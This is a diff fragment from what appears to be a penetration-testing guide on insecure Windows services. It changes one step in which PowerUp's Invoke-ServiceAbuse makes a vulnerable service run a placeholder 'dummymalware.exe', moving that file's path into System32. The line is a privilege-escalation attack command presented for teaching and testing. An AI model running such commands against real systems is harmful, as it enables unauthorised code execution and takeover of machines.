@@ -68,6 +68,6 @@ An insecure Windows service is one that can be easily exploited by a Penetration
    ```
 5. To exploit the insecure service with PowerUp.ps1, run
    ```
-   Invoke-ServiceAbuse -Name "InsecureService" -Command "C:\Path\To\dummymalware.exe"
+   Invoke-ServiceAbuse -Name "InsecureService" -Command "C:\Windows\System32\dummymalware.exe"
    ```
 6. 
